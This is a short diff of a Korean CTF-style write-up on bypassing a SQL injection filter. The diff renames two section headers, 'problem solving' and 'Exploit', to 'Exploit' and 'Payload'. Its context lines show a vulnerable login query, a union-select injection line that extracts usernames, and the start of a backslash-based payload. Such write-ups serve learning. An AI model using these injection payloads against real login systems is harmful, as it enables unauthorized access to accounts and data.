@@ -150,7 +150,7 @@ or, and에 이어 `‘(따옴표)`가 금지 당함
 
 |
 
-## 문제 풀이
+## Exploit
 
 ```sql
 SELECT * FROM user WHERE username = '{username}' AND password = '{password}'
@@ -200,7 +200,7 @@ union select 1,(select username from user limit 1,1),3 -- 1
 
 |
 
-## Exploit
+## Payload
 
 ```
 username: \
